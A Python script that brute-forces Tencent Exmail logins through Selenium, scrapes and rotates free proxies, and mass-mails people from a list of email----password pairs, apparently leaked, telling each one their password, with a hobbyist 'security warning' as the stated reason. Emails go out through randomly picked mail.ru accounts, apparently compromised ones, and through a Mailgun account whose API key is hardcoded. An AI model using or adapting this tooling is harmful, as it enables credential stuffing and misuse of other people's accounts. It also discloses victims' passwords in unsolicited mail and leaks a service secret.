# coding:utf-8
import time
import sys

from selenium import webdriver
from selenium.webdriver.common.keys import Keys


def brute_tencent(user, pwd):
    brower = webdriver.Chrome()
    brower.get("https://exmail.qq.com/cgi-bin/loginpage")
    elem_id = brower.find_element_by_id("inputuin")
    elem_id.send_keys(user)
    elem_pass = brower.find_element_by_id("pp")
    elem_pass.send_keys(pwd)
    elem_pass.send_keys(Keys.RETURN)

    time.sleep(1)
    # 判断登陆成功
    try:
        element = brower.find_element_by_id("subject")
    except Exception as msg:
        brower.close()
    else:
        print("Success:user:%s pwd:%s" % (user, pwd))

def gey():
    file=open("ip.txt",'r')
    ip_li=file.read()
    ip=[]
    for i in ip_li.split("\n"):
        ip.append(i)
    import random
    return ip[int(random.uniform(0,len(ip)))]

def get_proxy():
    from bs4 import BeautifulSoup
    from urllib.request import urlopen
    from urllib.request import Request

    def get_ip_list(obj):
        ip_text = obj.findAll('tr', {'class': 'odd'})
        ip_list = []
        for i in range(len(ip_text)):
            ip_tag = ip_text[i].findAll('td')
            ip_port = ip_tag[1].get_text() + ':' + ip_tag[2].get_text()
            ip_list.append(ip_port)
        # print("共收集到了{}个代理IP".format(len(ip_list)))
        # print(ip_list)
        return ip_list

    def get_random_ip(bsObj):
        ip_list = get_ip_list(bsObj)
        import random
        random_ip = 'http://' + random.choice(ip_list)
        proxy_ip = [random_ip]
        return proxy_ip

    if __name__ == '__main__':
        url = 'http://www.xicidaili.com/'
        headers = {
            'User-Agent': 'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36'}
        request = Request(url, headers=headers)
        response = urlopen(request)
        bsObj = BeautifulSoup(response, 'html')





        while True:
            import requests
            random_ip = get_random_ip(bsObj)
            try:
                r = requests.get('https://www.baidu.com', proxies={"https": random_ip}, timeout=2)
                return (random_ip)
            except:
                pass

def send(user,pwd):
    # -*- coding=utf-8 -*-
    import smtplib
    import time
    # from pymongo import MongoClient
    from email.mime.text import MIMEText
    """
    people
    [{"id":"贝贝","address":"lghher1991@163.com"},{"id":"航航","address":"lghher1990@163.com"}]


    email
    {"sub":"标题","html":"<html><h1>贝贝</h1></html>"}
    """
    mssg = '您好，我是Muxxs,一名爱好网络安全的高中生，我监测到您的密码曾为:' + pwd+"请您立刻加强您的邮箱及信息安全，祝您有美好的一天，再见。\n"+"Hello, I am Muxxs, a high school student who is interested in network security. I have observed that your password was:"+pwd+"Please immediately strengthen your email and information security. Have a nice day. Good bye."+"\n 如果您有任何问题，请添加我的INS:muxxs_ /Facebook:Mu Mu/QQ：179013204 或者访问我的博客：muxxs.com\n"+"If you have any questions, please add my INS: muxxs_ or Facebook: Mu Mu/QQ：179013204,or visit my blog: muxxs. com."

    def sendEmail(u_list, sub, content):
        try:
            smtp_host = 'smtp.mailgun.com'
            account = 'postmaster@email.muxxs.com'
            password = 'd3585b70e081aa82102eeb5b0162c383-115fe3a6-aa850bcb'
            msg = MIMEText(content, 'plain', 'utf-8')
            msg["Accept-Language"] = "zh-CN"
            msg["Accept-Charset"] = "ISO-8859-1,utf-8"
            msg['Subject'] = sub
            msg['From'] = account
            # msg['To']=';'.join(u_list)
            msg['To'] = (u_list)
            smtp = smtplib.SMTP(smtp_host)
            smtp.login(account, password)
            smtp.sendmail(account, u_list, msg.as_string())
            smtp.quit()
            print(u_list+"发送成功")
        except:print(u_list+"发送失败")

    sub = '慕幕沐'
    content = 'hello mailgun'
    sendEmail(user, sub, mssg)

def send_mail(user,pwd):
    file=open("mail-ru.txt","r")
    content = file.read()
    file.close()
    emails=[]
    for i in content.split("\n"):
        if not i=="":
            item = i.split("----")
            items = []
            items.append(item[0])
            items.append(item[1])
            emails.append(items)

    import socks,smtplib,random

    which = int(random.uniform(0, 5))
    users = emails[which][0]
    passwd = emails[which][1]


    # socks.setdefaultproxy(TYPE, ADDR, PORT)
    #pro=get_proxy()[0].split(":")
    #print(pro)
    De=True
    while De:
        import requests
        random_ip = gey()
        print(random_ip)
        try:
            pro=random_ip.split(":")
            De=False
        except:
            pass
    import ssl
    ssl._create_default_https_context = ssl._create_unverified_context
    #socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, pro[0], int(pro[1]))
    #print(pro)
    #socks.wrapmodule(smtplib)
    print("sec!!!!!")


    smtpserver = 'smtp.mail.ru'
    AUTHREQUIRED = 1
    smtpuser = users
    smtppass = passwd

    RECIPIENTS = user
    SENDER = users
    mssg = '您好，我是Muxxs,一名爱好网络安全的高中生，我监测到您的密码曾为:' + pwd+"请您立刻加强您的邮箱及信息安全，祝您有美好的一天，再见。\n"+"Hello, I am Muxxs, a high school student who is interested in network security. I have observed that your password was:"+pwd+"Please immediately strengthen your email and information security. Have a nice day. Good bye."+"\n 如果您有任何问题，请添加我的INS:muxxs_ /Facebook:Mu Mu/QQ：179013204 或者访问我的博客：muxxs.com\n"+"If you have any questions, please add my INS: muxxs_ or Facebook: Mu Mu/QQ：179013204,or visit my blog: muxxs. com."
    s = mssg.encode("utf-8")
    from email.mime.text import MIMEText
    from email.header import Header

    msg = MIMEText(mssg, 'text', 'utf-8')
    meg=[]
    msg['Subject'] = Header("慕幕沐", 'utf-8')

    # 报错原因是因为“发件人和收件人参数没有进行定义
    msg['from'] = SENDER
    msg['to'] = RECIPIENTS

    print("pro")
    server = smtplib.SMTP_SSL(smtpserver,465)
    print(user)
    server.ehlo()
    #server.starttls()
    #server.ehlo()
    server.login(smtpuser, smtppass)
    #server.set_debuglevel(1)
    server.sendmail(SENDER, [RECIPIENTS], msg.as_string())
    server.quit()





emails=[]
file=open("data.txt","r")
content=file.read()
file.close()
for i in content.split("\n"):
    item=i.split("----")
    items=[]
    items.append(item[0])
    items.append(item[1])
    emails.append(items)





def old(user,pwd):
    file = open("mail-ru.txt", "r")
    content = file.read()
    file.close()
    emails = []
    for i in content.split("\n"):
        if not i == "":
            item = i.split("----")
            items = []
            items.append(item[0])
            items.append(item[1])
            emails.append(items)

    import socks, smtplib, random
    import yagmail, random
    import socks, smtplib, random



    which = int(random.uniform(0, 10))
    users = emails[which][0]
    passwd = emails[which][1]
    smtphost="smtp.mail.ru"
    yag = yagmail.SMTP(user=users, password=passwd, host=smtphost)

    # 邮箱正文
    contents = ['您好，我是Muxxs,一名爱好网络安全的高中生，我监测到您的密码曾为:' + pwd + "请您立刻加强您的邮箱及信息安全，祝您有美好的一天，再见。\n" +
                "Hello, I am Muxxs, a high school student who is interested in network security. I have observed that your password was:" + pwd + "Please immediately strengthen your email and information security. Have a nice day. Good bye."
                + "\n 如果您有任何问题，请添加我的INS:muxxs_ /Facebook:Mu Mu/QQ：179013204 或者访问我的博客：muxxs.com\n" + "If you have any questions, please add my INS: muxxs_ or Facebook: Mu Mu/QQ：179013204,or visit my blog: muxxs. com."]
    # 发送邮件
    try:
        yag.send(user, '慕幕沐', contents)
        print(user + ":sec.  by:"+users)
    except:
        try:
            import yagmail, random
            which = int(random.uniform(0, 104))
            users = emails[which][0]
            passwd = emails[which][1]
            yag = yagmail.SMTP(user=users, password=passwd, host=smtphost)

            # 邮箱正文
            contents = ['您好，我是Muxxs,一名爱好网络安全的高中生，我监测到您的密码曾为:' + pwd + "请您立刻加强您的邮箱及信息安全，祝您有美好的一天，再见。\n" +
                        "Hello, I am Muxxs, a high school student who is interested in network security. I have observed that your password was:" + pwd + "Please immediately strengthen your email and information security. Have a nice day. Good bye."
                        + "\n 如果您有任何问题，请添加我的INS:muxxs_ /Facebook:Mu Mu/QQ：179013204 或者访问我的博客：muxxs.com\n" + "If you have any questions, please add my INS: muxxs_ or Facebook: Mu Mu/QQ：179013204,or visit my blog: muxxs. com."]
            # 发送邮件
            try:
                yag.send(user, '慕幕沐', contents)
                print(user + ":sec.  by:"+users)
            except:
                print(user + "|" + users + "fail")
        except:
            pass


num=0
for add,pas in emails:
    num=num+1
    print("开始发送第"+str(num)+"个")
    send(add,pas)
